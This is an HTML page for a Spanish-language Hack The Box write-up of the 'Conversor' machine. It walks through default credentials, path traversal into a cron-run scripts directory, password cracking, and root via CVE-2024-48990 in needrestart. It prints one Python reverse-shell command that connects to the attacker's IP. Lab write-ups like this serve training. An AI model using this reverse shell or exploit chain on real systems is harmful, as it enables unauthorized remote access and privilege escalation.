@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Write-up - Conversor</title>
+    <link
+      rel="icon"
+      type="image/svg+xml"
+      href="../assets/icons/terminal_icon.svg"
+    />
+    <link rel="stylesheet" href="../css/styles.css" />
+    <link rel="stylesheet" href="../css/cursor.css" />
+    <link rel="stylesheet" href="../css/scrollbar.css" />
+    <link rel="stylesheet" href="../css/contact-modal.css" />
+    <link rel="stylesheet" href="../css/writeups.css" />
+  </head>
+  <body class="theme-locked">
+    <div class="cursor"></div>
+    <div class="cursor-glow"></div>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="profile">
+        <div class="profile-img">
+          <img src="../assets/images/profile.png" alt="Alan Chalco - Ne0X-Z" />
+        </div>
+        <h1>Alan Chalco - Ne0X-Z</h1>
+        <p>Software Engineer & Cybersecurity Student</p>
+      </div>
+
+      <nav>
+        <ul class="nav-menu">
+          <li>
+            <a href="../index.html">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
+                  ></path>
+                  <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                </svg>
+              </span>
+              Inicio
+            </a>
+          </li>
+          <li>
+            <a href="../about.html">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <circle cx="12" cy="12" r="10"></circle>
+                  <line x1="12" y1="16" x2="12" y2="12"></line>
+                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                </svg>
+              </span>
+              Sobre Mí
+            </a>
+          </li>
+          <li>
+            <a href="../writeups/index.html" class="active">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <rect
+                    x="3"
+                    y="11"
+                    width="18"
+                    height="11"
+                    rx="2"
+                    ry="2"
+                  ></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+              </span>
+              Write-ups
+            </a>
+          </li>
+          <li>
+            <a href="../blog/index.html">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"
+                  ></path>
+                  <polyline points="14 2 14 8 20 8"></polyline>
+                  <line x1="16" y1="13" x2="8" y2="13"></line>
+                  <line x1="16" y1="17" x2="8" y2="17"></line>
+                  <polyline points="10 9 9 9 8 9"></polyline>
+                </svg>
+              </span>
+              Blog
+            </a>
+          </li>
+          <li>
+            <a href="#contact">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"
+                  ></path>
+                  <polyline points="22,6 12,13 2,6"></polyline>
+                </svg>
+              </span>
+              Contacto
+            </a>
+          </li>
+        </ul>
+      </nav>
+
+      <div class="social-links">
+        <a href="https://github.com/Ne0X-Z" title="GitHub" class="icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path
+              d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"
+            />
+          </svg>
+        </a>
+
+        <a
+          href="https://www.linkedin.com/in/ne0xx-18a9152a7"
+          title="LinkedIn"
+          class="icon"
+        >
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path
+              d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"
+            />
+            <rect x="2" y="9" width="4" height="12" />
+            <circle cx="4" cy="4" r="2" />
+          </svg>
+        </a>
+
+        <a href="https://tryhackme.com/p/ne0X" title="TryHackMe" class="icon">
+          <img src="../assets/icons/tryhackme.svg" alt="TryHackMe" />
+        </a>
+
+        <a
+          href="https://app.hackthebox.com/profile/2067867"
+          title="Hack The Box"
+          class="icon"
+        >
+          <img src="../assets/icons/htb-icon.svg" alt="Hack The Box" />
+        </a>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <div class="writeup-container">
+        <!-- Back Button -->
+        <a href="index.html#writeups" class="back-button">
+          <svg viewBox="0 0 24 24">
+            <line x1="19" y1="12" x2="5" y2="12"></line>
+            <polyline points="12 19 5 12 12 5"></polyline>
+          </svg>
+          Volver a Write-ups
+        </a>
+
+        <!-- Header del Write-up -->
+        <div class="writeup-header">
+          <div class="writeup-title-container">
+            <div>
+              <h1 class="writeup-title">Conversor</h1>
+
+              <div class="writeup-meta">
+                <div class="meta-item">
+                  <svg viewBox="0 0 24 24">
+                    <rect
+                      x="3"
+                      y="4"
+                      width="18"
+                      height="18"
+                      rx="2"
+                      ry="2"
+                    ></rect>
+                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                  </svg>
+                  <span>28 de Octubre, 2024</span>
+                </div>
+
+                <div class="meta-item">
+                  <svg viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <polyline points="12 6 12 12 16 14"></polyline>
+                  </svg>
+                  <span>20 min lectura</span>
+                </div>
+
+                <div class="meta-item">
+                  <span class="difficulty easy">Easy</span>
+                </div>
+
+                <div class="meta-item">
+                  <img src="../assets/icons/htb-icon.svg" alt="Hack The Box" />
+                  <span>Hack The Box</span>
+                </div>
+              </div>
+
+              <div class="writeup-tags">
+                <span class="writeup-tag">Linux</span>
+                <span class="writeup-tag">Web Exploitation</span>
+                <span class="writeup-tag">Arbitrary File Upload</span>
+                <span class="writeup-tag">Path Traversal</span>
+                <span class="writeup-tag">Needrestart CVE</span>
+              </div>
+            </div>
+
+            <img
+              src="../assets/images/writeups/conversor/conversor.png"
+              alt="Conversor"
+              class="machine-logo"
+            />
+          </div>
+        </div>
+
+        <!-- Contenido del Write-up -->
+        <div class="writeup-content">
+          <!-- Info Box -->
+          <div class="info-box">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="16" x2="12" y2="12"></line>
+                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+              </svg>
+              Información de la Máquina
+            </div>
+            <p>
+              IP: 10.10.11.92 | OS: Linux | Dificultad: Easy | Plataforma: Hack
+              The Box
+            </p>
+          </div>
+
+          <h2 id="reconocimiento">Reconocimiento</h2>
+          <p>
+            Iniciamos con un análisis de puertos TCP utilizando
+            <code>nmap</code> con el objetivo de identificar los servicios
+            expuestos en el sistema de destino.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/1.png"
+              alt="Nmap Scan Results"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 1: Resultados del escaneo inicial de Nmap
+          </div>
+
+          <p>
+            El host presenta los puertos 80 (HTTP) y 22 (SSH) abiertos. A
+            continuación se realizará un escaneo detallado de cada servicio
+            utilizando scripts NSE de Nmap orientados a detección de versiones
+            (-sCV) y enumeración de encabezados, entre otras cosas.
+          </p>
+
+          <div class="code-block">
+            <div class="code-header">
+              <div class="terminal-buttons">
+                <span class="btn-red"></span>
+                <span class="btn-yellow"></span>
+                <span class="btn-green"></span>
+              </div>
+              <span class="terminal-title">bash</span>
+            </div>
+            <div class="code-content">
+              <span class="prompt">$</span>
+              nmap -sCV -p22,80 -oN targetted 10.10.11.92
+            </div>
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/2.png"
+              alt="Nmap Service Scan Results"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 2: Escaneo detallado de servicios - Se identifica un dominio
+          </div>
+
+          <p>
+            Del escaneo se identifica un dominio asociado al servidor web.
+            Procedemos a agregarlo al archivo <code>/etc/hosts</code> para la
+            resolución DNS local.
+          </p>
+
+          <h2 id="enumeracion">Enumeración Web</h2>
+          <p>
+            Ejecutamos <code>whatweb</code> con la URL del objetivo para
+            identificar tecnologías y frameworks utilizados en la aplicación
+            web.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/3.png"
+              alt="Resultados de WhatWeb"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 3: Identificación de tecnologías con WhatWeb
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/4.png"
+              alt="Formulario de Login"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 4: Formulario de autenticación de la aplicación
+          </div>
+
+          <p>
+            Al acceder a la aplicación web, encontramos un formulario de login.
+            Probando credenciales por defecto como <code>admin:admin</code>,
+            logramos acceder exitosamente.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/5.png"
+              alt="Panel de Administración"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 5: Acceso como un usuario "admin".
+          </div>
+
+          <h2 id="analisis-codigo">Análisis del Código Fuente</h2>
+
+          <p>
+            En la sección "About" del panel, encontramos información relevante
+            sobre la aplicación y la posibilidad de descargar el código fuente.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/6.png"
+              alt="Sección About"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 6: Sección About con enlace al código fuente
+          </div>
+
+          <p>
+            Procedemos a descargar y analizar el código fuente de la aplicación
+            para identificar posibles vulnerabilidades.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/7.png"
+              alt="README del código"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 7: Contenido del archivo README
+          </div>
+
+          <p>
+            El README nos revela información crítica: el servidor tiene una
+            tarea cron que ejecuta scripts de Python en el directorio scripts/
+            en la raíz de la web como el usuario <code>www-data</code>. Si
+            logramos subir un archivo <code>.py</code> en esa ruta, podríamos
+            ejecutar código arbitrario.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/8.png"
+              alt="Análisis del código"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 8: Análisis del código - Identificación de tarea cron
+          </div>
+
+          <h3>Identificación de Path Traversal</h3>
+
+          <p>
+            Analizando el código fuente, identificamos una sección sospechosa
+            donde la aplicación convierte archivos XML a XSLT. Lo interesante es
+            que no se está validando correctamente el nombre del archivo y se lo
+            guarda directamente en el sistema. Al no existir esa validación,
+            podríamos intentar un ataque de Path Traversal.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/9.png"
+              alt="Código vulnerable"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 9: Código vulnerable - Falta de validación en nombres de
+            archivo
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/10.png"
+              alt="Función de subida de archivos"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 10: Función de procesamiento de archivos sin sanitización
+          </div>
+
+          <p>
+            La aplicación procesa archivos XML y XSLT sin validar apropiadamente
+            el nombre del archivo. Esto sugiere la posibilidad de un ataque de
+            Path Traversal que nos permitiría escribir un archivo
+            <code>.py</code> en el directorio de scripts.
+          </p>
+
+          <h2 id="explotacion">Explotación - Path Traversal</h2>
+
+          <p>
+            Procedemos a explotar la vulnerabilidad de Path Traversal para subir
+            un script Python malicioso en el directorio donde la aplicación
+            ejecuta scripts.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/11.png"
+              alt="Payload de Path Traversal"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 11: Guardado del archivo subido sin validación del nombre.
+          </div>
+
+          <div class="info-box warning">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                ></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              Nota Técnica
+            </div>
+            <p>
+              El Path Traversal es una vulnerabilidad que permite acceder o
+              escribir archivos fuera del directorio permitido usando secuencias
+              como <code>../</code> para saltar carpetas y llegar a ubicaciones
+              sensibles del sistema.
+            </p>
+          </div>
+
+          <p>
+            Entonces, para validar si esto aplica en este caso, vamos a tratar
+            de subir un archivo que tenga un código python que nos envíe traza
+            ICMP a nuestra máquina. Si logramos ver esos paquetes en nuestra
+            máquina, sabremos que el script se ejecutó correctamente.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/12.png"
+              alt="Verificación de ejecución"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 12: Verificación de que el script se ejecuta correctamente
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/13.png"
+              alt="Script ejecutándose"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 13: Confirmación de ejecución del script malicioso
+          </div>
+
+          <h2 id="acceso-inicial">Acceso Inicial</h2>
+
+          <p>
+            Una vez confirmado que podemos ejecutar código Python arbitrario,
+            procedemos a modificar nuestro script para obtener una reverse
+            shell.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/14.png"
+              alt="Reverse shell payload"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 14: Script Python con reverse shell
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/15.png"
+              alt="Acceso obtenido"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 15: Reverse shell recibida - Acceso inicial al sistema
+          </div>
+
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+              </svg>
+              Acceso Inicial Obtenido
+            </div>
+            <p>
+              Hemos obtenido acceso al sistema como el usuario de la aplicación
+              web.
+            </p>
+          </div>
+
+          <h3>Enumeración Post-Explotación</h3>
+
+          <p>
+            Durante la enumeración del sistema encontramos la base de datos que
+            usa aplicación web. Y dentro de la misma encontramos las contraseñas
+            encriptadas de los usuarios.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/16.png"
+              alt="Base de datos"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 16: Credenciales encontradas en la base de datos
+          </div>
+
+          <p>
+            Hay un usuario llamado <code>Fismathack</code> el cuál también
+            existe como usuario del sistema. Su credencial encontrada en la base
+            de datos podrían ser reutilizadas en el sistema, por lo que podemos
+            tratar de crackear el hash.
+          </p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/conversor/17.png" />
+          </div>
+          <div class="image-caption">
+            Imagen 17: Crackeando hashes con la herramienta CrackStation.
+          </div>
+
+          <p>Vemos que sí hemos logrado crackear el hash.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/conversor/18.png" />
+          </div>
+          <div class="image-caption">
+            Imagen 18: Escalando a usuario Fismathack.
+          </div>
+
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+              </svg>
+              User Flag Obtenida
+            </div>
+            <p>
+              Las credenciales fueron válidas y obtuvimos acceso como el usuario
+              <code>Fismathack</code>.
+            </p>
+          </div>
+
+          <h2 id="escalada">Escalada de Privilegios</h2>
+
+          <p>
+            Ejecutamos <code>sudo -l</code> para verificar los comandos que el
+            usuario actual puede ejecutar con privilegios de sudoers.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/19.png"
+              alt="Permisos sudo"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 19: Usuario puede ejecutar needrestart como root
+          </div>
+
+          <p>
+            El usuario puede ejecutar <code>/usr/bin/needrestart</code> como
+            root sin contraseña.
+          </p>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/20.png"
+              alt="Vulnerabilidad needrestart"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 20: Información sobre el binario needrestart
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/22.png"
+              alt="Análisis del exploit"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 22: Análisis del exploit - Limitaciones del sistema
+          </div>
+
+          <p>
+            Investigando este binario, encontramos que existe una vulnerabilidad
+            conocida (CVE) que permite escalada de privilegios.
+          </p>
+
+          <h3>Análisis de la Vulnerabilidad CVE-2024-48990</h3>
+
+          <p>
+            La vulnerabilidad radica en cómo <code>needrestart</code> determina
+            si un proceso de Python necesita reiniciarse. El programa extrae la
+            variable de entorno <code>PYTHONPATH</code> desde
+            <code>/proc/pid/environ</code> y la establece antes de ejecutar
+            Python.
+          </p>
+
+          <p>
+            Si un proceso de Python pertenece a un atacante local, needrestart
+            ejecuta Python con una variable <code>PYTHONPATH</code> controlada
+            por el atacante, lo que permite ejecutar código arbitrario como root
+            mediante la carga de módulos maliciosos.
+          </p>
+
+          <div class="info-box warning">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                ></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              Desafío Técnico
+            </div>
+            <p>
+              Encontramos este PoC, pero el sistema objetivo no tiene
+              <code>gcc</code> instalado, lo que dificulta la compilación de
+              exploits que requieren librerías compartidas. Debemos buscar un
+              enfoque alternativo.
+            </p>
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/23.png"
+              alt="Exploit alternativo"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 23: Exploit alternativo que no requiere compilación
+          </div>
+
+          <h3>Explotación de needrestart</h3>
+
+          <p>
+            Encontramos un PoC que nos explica cómo explotarlo de manera manual.
+            El ataque se basa en los siguientes pasos:
+          </p>
+
+          <div class="info-box">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="16" x2="12" y2="12"></line>
+                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+              </svg>
+              Pasos del Exploit
+            </div>
+            <ul>
+              <li>
+                Crear un módulo Python malicioso (<code>importlib</code>) con
+                código de reverse shell
+              </li>
+              <li>Iniciar un proceso Python en bucle para mantenerlo activo</li>
+              <li>
+                Exportar la variable <code>PYTHONPATH</code> apuntando a nuestro
+                módulo malicioso
+              </li>
+              <li>Ejecutar <code>needrestart</code> como root</li>
+              <li>
+                needrestart cargará nuestro módulo malicioso y ejecutará el
+                código como root
+              </li>
+            </ul>
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/24.png"
+              alt="Preparación del exploit"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 24: Creación del módulo malicioso
+          </div>
+
+          <div
+            class="code-block"
+            style="
+              width: 100% !important;
+              max-width: 100% !important;
+              box-sizing: border-box;
+            "
+          >
+            <div class="code-header">
+              <div class="terminal-buttons">
+                <span class="btn-red"></span>
+                <span class="btn-yellow"></span>
+                <span class="btn-green"></span>
+              </div>
+              <span class="terminal-title">bash</span>
+            </div>
+            <div
+              class="code-content"
+              style="
+                overflow-x: auto;
+                white-space: nowrap;
+                scrollbar-width: none;
+                -ms-overflow-style: none;
+                -webkit-scrollbar: none;
+              "
+            >
+              <span class="prompt">$</span>
+              echo 'import
+              os,pty,socket;s=socket.socket();s.connect(("10.10.15.27",1337));[os.dup2(s.fileno(),f)for
+              f in(0,1,2)];pty.spawn("sh")' >> importlib/__init__.py
+            </div>
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/25.png"
+              alt="Exportar PYTHONPATH"
+            />
+          </div>
+          <div class="image-caption">Imagen 25: main.py</div>
+
+          Ahora, creamos un archivo main.py con este contenido para que simule
+          un proceso de python en bucle Ahora, debemos exportar la variable
+          PYTHONPATH apuntando al módulo malicioso que creamos anteriormente.
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/26.png"
+              alt="Ejecutar needrestart"
+            />
+          </div>
+
+          <div class="image-caption">
+            Imagen 26: Exportamos variable PYTHONPATH apuntando al módulo
+            malicioso.
+          </div>
+
+          <p>
+            Después de crear el módulo malicioso y exportar la variable
+            <code>PYTHONPATH</code>, en una terminal ejecutamos el script
+            main.py y nos ponemos en escucha en nuestra máquina atacante.
+          </p>
+
+          <p>
+            Finalmente, en otra terminal ejecutamos
+            <code>sudo /usr/bin/needrestart</code> para activar la
+            vulnerabilidad y obtener una shell root.
+          </p>
+
+          <div class="info-box warning">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                ></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              Nota Importante
+            </div>
+            <p>
+              La primera vez que ejecutemos <code>needrestart</code>,
+              recibiremos una reverse shell como nuestro usuario actual (no como
+              root). Simplemente cerramos esa shell con Ctrl+C y ejecutamos
+              <code>needrestart</code>
+              nuevamente. Lo importante es que el script Python continúe
+              ejecutándose en segundo plano.
+            </p>
+          </div>
+
+          <div class="writeup-image">
+            <img
+              src="../assets/images/writeups/conversor/27.png"
+              alt="Root shell obtenida"
+            />
+          </div>
+          <div class="image-caption">
+            Imagen 27: Root shell obtenida exitosamente
+          </div>
+
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+              </svg>
+              Root Flag Obtenida
+            </div>
+            <p>
+              Hemos obtenido acceso root al sistema explotando la vulnerabilidad
+              CVE-2024-48990 en needrestart.
+            </p>
+          </div>
+
+          <h3>Resumen del Ataque</h3>
+
+          <p>La cadena de explotación completa fue la siguiente:</p>
+
+          <div class="info-box">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
+              </svg>
+              Cadena de Ataque
+            </div>
+            <ul>
+              <li>
+                <strong>Reconocimiento:</strong> Identificación de servicios
+                HTTP (80) y SSH (22)
+              </li>
+              <li>
+                <strong>Enumeración:</strong> Acceso con credenciales por
+                defecto (admin:admin)
+              </li>
+              <li>
+                <strong>Análisis:</strong> Descarga y análisis del código fuente
+                de la aplicación
+              </li>
+              <li>
+                <strong>Path Traversal:</strong> Explotación de falta de
+                validación en nombres de archivo
+              </li>
+              <li>
+                <strong>RCE:</strong> Ejecución de código Python arbitrario
+                mediante subida de archivo malicioso
+              </li>
+              <li>
+                <strong>Pivoting:</strong> Reutilización de credenciales de base
+                de datos para SSH
+              </li>
+              <li>
+                <strong>Escalada:</strong> Explotación de CVE-2024-48990 en
+                needrestart para obtener root
+              </li>
+            </ul>
+          </div>
+
+          <p>
+            Este write-up tiene fines puramente educativos. Las técnicas
+            descritas solo deben ser utilizadas en entornos controlados y con
+            autorización explícita.
+          </p>
+        </div>
+      </div>
+    </main>
+
+    <!-- Contact Modal -->
+    <div id="contactModal" class="modal">
+      <div class="modal-overlay"></div>
+      <div class="modal-content">
+        <button class="modal-close" id="closeModal">
+          <svg viewBox="0 0 24 24">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+
+        <div class="modal-header">
+          <div class="terminal-prompt">
+            <span class="prompt-symbol">$</span>
+            <span class="prompt-text">establishing_secure_connection...</span>
+            <span class="cursor-blink">_</span>
+          </div>
+          <h2>Canales de Comunicación Seguros</h2>
+          <p>Selecciona tu método preferido de contacto</p>
+        </div>
+
+        <div class="contact-channels">
+          <!-- Email Channel -->
+          <a href="mailto:n30xx7@gmail.com" class="channel-card">
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"
+                ></path>
+                <polyline points="22,6 12,13 2,6"></polyline>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[ENCRYPTED EMAIL]</h3>
+              <p class="channel-value">n30xx7@gmail.com</p>
+              <span class="channel-status">Respuesta en 24-48h</span>
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </div>
+          </a>
+
+          <!-- LinkedIn Channel -->
+          <a
+            href="https://www.linkedin.com/in/ne0xx-18a9152a7"
+            target="_blank"
+            class="channel-card"
+          >
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"
+                ></path>
+                <rect x="2" y="9" width="4" height="12"></rect>
+                <circle cx="4" cy="4" r="2"></circle>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[PROFESSIONAL NETWORK]</h3>
+              <p class="channel-value">LinkedIn Profile</p>
+              <span class="channel-status">Networking & Colaboración</span>
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </div>
+          </a>
+
+          <!-- GitHub Channel -->
+          <a
+            href="https://github.com/Ne0X-Z"
+            target="_blank"
+            class="channel-card"
+          >
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"
+                ></path>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[CODE REPOSITORY]</h3>
+              <p class="channel-value">github.com/Ne0X-Z</p>
+              <span class="channel-status">Proyectos & Colaboración</span>
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </div>
+          </a>
+
+          <!-- PGP Key -->
+          <div class="channel-card pgp-card">
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[PGP PUBLIC KEY]</h3>
+              <p class="channel-value">Comunicación cifrada disponible</p>
+              <span class="channel-status"
+                >Click para copiar la clave pública</span
+              >
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <polyline points="6 9 12 15 18 9"></polyline>
+              </svg>
+            </div>
+          </div>
+        </div>
+
+        <div class="modal-footer">
+          <div class="security-notice">
+            <svg viewBox="0 0 24 24">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
+            <span
+              >Todas las comunicaciones son tratadas con confidencialidad</span
+            >
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Notification Toast -->
+    <div id="notification" class="notification">
+      <div class="notification-content">
+        <svg class="notification-icon" viewBox="0 0 24 24">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+        <span class="notification-text">Texto copiado</span>
+      </div>
+    </div>
+
+    <script src="../js/cursor.js"></script>
+    <script src="../js/card-effects.js"></script>
+    <script src="../js/contact-modal.js"></script>
+  </body>
+</html>
